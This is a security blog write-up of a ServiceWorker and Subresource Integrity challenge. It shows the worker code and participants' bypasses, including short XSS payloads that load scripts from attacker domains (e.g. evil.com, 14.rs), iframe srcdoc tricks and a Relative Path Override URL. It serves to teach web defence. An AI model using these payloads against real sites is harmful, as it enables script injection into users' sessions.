Title: Challenge Write-up: Subresource Integrity in Service Workers
Date: 2017-03-25
Author: Frederik
Slug: sw-sri-challenge

# Challenge Write-up: Subresource Integrity in Service Workers

For those who have not participated in my [challenge](https://serviceworker.on.web.security.plumbing/), this document is about implementing security features in ServiceWorkers. A
ServiceWorker (SW) is a type of [Web Worker](https://duckduckgo.com/?q=web+worker&t=ffab&ia=web) that can intercept and modify HTTP requests. A ServiceWorker is allowed to see requests towards your own as well as other origins – though it [must not](https://frederik-braun.com/publications/thesis/Thesis-Origin_Policy_Enforcement_in_Modern_Browsers.pdf) be able to see the response from cross-origin resources.

The idea of the [challenge](https://serviceworker.on.web.security.plumbing/) was to write a tiny ServiceWorker that would intercept all HTTP requests and cancel everything except those blessed by a white-list. On top of that, external resources (e.g., scripts) must only be loaded with [Subresource Integrity](https://www.w3.org/TR/SRI/) (SRI). This can be easily achieved, because `fetch()` supports SRI out of the box:
If you supply the `integrity` keyword in the options parameter to `fetch`, it will automatically fail unless the hashes match:

Here's the relevant code snippet with some extra comments
```js
self.addEventListener("fetch", function(event) {
  let request = event.request;
  if (request.method === "GET") {
    // check if URL in pre-defined whitelist at the top of the document:
    if (request.url in INTEGRITY_METADATA) { 
      // if HTML does not contain integrity=, use from the whitelist
      let sriHash = request.integrity || INTEGRITY_METADATA[request.url];
      let fetchOptions = {
        integrity: sriHash,
        method: request.method,
        mode: "cors", // if we have integrity metadata, it should also use cors
        credentials: "omit", // ...and omit credentials
        cache: "default",
      };
      // ServiceWorker lets the document proceed fetching the resource, but with modified fetch options
      event.respondWith(fetch(request, fetchOptions));
```

The goal of the challenge was to make the document execute your script - essentially bypassing the ServiceWorker. To facilitate such an attack, I implemented a simple reflected Cross-Site-Scripting (XSS) vulnerability and hinted to its existence in the rules. XSS in general allows executing all kinds of scripts. Inline as well as from a specified URL. Because we wanted the script to go through the ServiceWorker, we have also hardened the challenge with a Content Security Policy (CSP). Content Security Policy is a mechanism to restrict how scripts can be run from a website. The policy that I used disallowed all kinds of inline scripts in tags or event handlers (e.g., `<script>...</script>` or `onerror=`).
This essentially required an attacker to request a script that is living on their own domain, thus forcing them through the ServiceWorker.

Unless, of course, the attacker was able to find a browser bug involving an arcane constellation of markup that does *not* trigger the Fetch Event declared in the ServiceWorker.

### PEBKAC

As it turns out, most browsers bypass the ServiceWorker when reloading a page with CTRL+SHIFT+R. Not only did this cause some invalid submissions, it also took me until the day I am trying to summarize my finding to notice that I have incorrectly approved some attacks when they do not actually work. This affects the following submissions:
[Mario Heiderich](https://twitter.com/0x6D6172696F)'s vector is `<svg><script/href=//14.rs></script>` (which is even shorter on Firefox, because you can leave the closing `</script>` tag out).

*But it does not work* unless you hard-refresh. But with a hard-refresh, even `<script/href=//14.rs></script>` works, because, well, hard-refreshes bypass the ServiceWorker.

The same goes for [Artur Janc](https://twitter.com/arturjanc/)'s submission. His approach looks like this `<base href="//14.rs"><script src=/></script>`, using Mario's short domain name. It also falls flat when the ServiceWorker is correctly installed.

I'm sincerely sorry, but I have to gently wipe you off the leader board. I admit I should have done a better job at testing.
I'm very sure you would have found a valid solution, if I had judged the challenge more properly.

### Bypassing the Service Worker

Now, let's head on to the first submission.
First blood was drawn by [Manuel Caballero](https://twitter.com/magicmac2000/), who figured out that a script loaded in an `<iframe srcdoc=..>` is not going through the ServiceWorker. This is somewhat weird, given that a script running `navigator.serviceWorker.getRegistrations()` in this iframe returns the active ServiceWorker at sri-worker.js.

[Masato Kinugawa](https://twitter.com/kinugawamasato) promptly followed suite with the same attack vector. He also noted that a simple `<script src=evil.com></script>`-style vector also works in Private Browsing mode. This stems from the fact that the XSS vulnerability usually wins a race with the ServiceWorker registration. Note that the ServiceWorker must be registered from a separate JS file, since inline scripts are disallowed by CSP. This registration happens asynchronously and has to be faster then another script tag that is controlled by the attacker. It's certainly noteworthy, but I did not count this as a valid submission: In a real life scenario, an attacker is only really successful if the victim has a session associated with the web page and has also visited the web page before. In this case, the ServiceWorker is already registered and the bootstrapping is a no-op.
I admit that this is a clear gap in my rules, so kudos to [Masato Kinugawa](https://twitter.com/kinugawamasato) (and some other folks who found this issue later on)!

[Alex Inführ](https://twitter.com/insertScript/) sent a solution that also used iframe srcdoc, but added the sandbox attribute, which cost him a few more characters.

In a similar vain, [Eduardo Vela](https://twitter.com/sirdarckcat/) sent me to [https://0v.lv/?e](https://0v.lv/?e), which contains an iframe sandbox, that links to a conventional XSS on the domain. The trick here, is that navigations from an iframe sandbox pointing to a website with a Service Worker will skip trigger the ServiceWorker. This is a nice find, but wasn't considered a valid solution as it required user interaction.

### Implementation flaws and assumptions

Having looked at those submissions that the ServiceWorker does not see, let's take another look at the rest of its source code. Some submissions also found implementation bugs. Here's the code right after the white-list check. Again, I'll add some extra comments.

```js
let LOCALFILES = {};
LOCALFILES["/style.css"] = "sha384-q2bP418TFL/LOAo5XrjD7OciiOi63q6OKnDH67oOGNkWc/rvUaWpynoatxySxEPF";
LOCALFILES["/sri-sha.js"] = "sha384-TKCoLrAkiPTzJzLNLqSmFqC0XA9PCMUwSYg2E/FosZEy7h26mwR9wONvTZ9Zvtj9";
LOCALFILES["/initialize-sw.js"] = "sha384-32IhktVnY10EwfUKtlhYBUoBysS2QM8cmW1bW2HENM3nIEmGDNwpkqdmpaE2jF7Z";#
LOCALFILES["/sri-worker.js"] = "sha384-rRSq8lAgvvL9Tj617AxQJyzf1mB0sO0DfJoRJUMhqsBymYU3S+6qW4ClBNBIvhhk"
let parsed = new URL(request.url);
// other free pass: same-origin
if (parsed.origin === ownLocation.origin) {
  // we allow ourselves (the forward-slash) and paths required for the website to work. some stylesheets etc.
  if ((parsed.pathname === '/') || (parsed.pathname in LOCALFILES)) {
    // note that these requests do not require integrity. the integrity metadata in the object was left out here. 
    // this is mostly a decoy "bug", which I was hoping would confuse people.
    console.log("Fetching same-origin thingy", request.url)
    event.respondWith(fetch(request));
  } else {
    console.log(`[${LOGNAME}] Can not fetch ${request.url}. No integrity metadata.`);
    event.respondWith(Response.error());
  }
} else {
  // cross-origin: blocked.
  console.log(`[${LOGNAME}] Can not fetch ${request.url}. No integrity metadata.`);
 event.respondWith(Response.error());
}
```

To briefly summarize, we first perform a same-origin check and then allow files in the same origin that are contained in the `LOCALFILES` object or the file `/`. Even though the object contains hashes, these are never added to the request and thus never checked. I did not think of this case as a vulnerability and mostly left this inconsistency as a decoy.
For every other type of request the code responds with a network error, i.e.,`Response.error()`.

### Thinking outside the box

This fine submission reached me when I was leaving the subway on my way home and I *really* did not understand what was going on:

[https://serviceworker.on.web.security.plumbing/index.php/?name=&lt;script/src=//0v.lv>&lt;/script>](https://serviceworker.on.web.security.plumbing/index.php/?name=%3Cscript%2Fsrc%3D%2F%2F0v.lv%3E%3C%2Fscript%3E)

The really important thing to note here is that the request URL contains `/index.php/?name=`.
This trick is called [Relative Path Override (or RPO)](http://www.thespanner.co.uk/2014/03/21/rpo/). A technique first described and coined by [Gareth Heyes](https://twitter.com/garethheyes). RPO attacks the fact that the script is loading resources from a relative path `initialize-sw.js`. The attacker providing a different request path, can thus mess up the additional resource loading. The website will attempt to load the necessary files from `/index.php/initialize-sw.js` instead and therefore fails.

This is of course extra nasty, when those scripts behind relative paths are implementing security features.
A truly nice find, by [Eduardo Vela](https://twitter.com/sirdarckcat/)!


### Conclusions & Acknowledgments

It's interesting to use fresh technologies like ServiceWorkers, Subresource Integrity and Content Security Policy (heh) in combination and see what happens. Building your own security solutions on top of the web platform is a very complex undertaking and makes you realize that those features were created ad-hoc in a very unsystematic way. As a result of that, I'd advise you not to implement hard guarantees about regulating `fetch()` calls using Service Workers.

But it's always great fun to think of something interesting and then have yourself proven wrong in the real world. Thanks to [Anne van Kersteren](https://twitter.com/annevk/) for making me look into an implementation of Subresource Integrity (and `require-sri-for`) with Service Workers. And of course, thanks to all the participants that tried (and succeeded) to break the implementation in various ways.

If you want mandatory Subresource Integrity, I recommend you look into the SRI2 working draft. The `require-sri-for` CSP extension has been implemented in Firefox and Chrome, but in both cases it's behind a flag (`security.csp.experimentalEnabled` and *experimental Web Platform features* respectively)
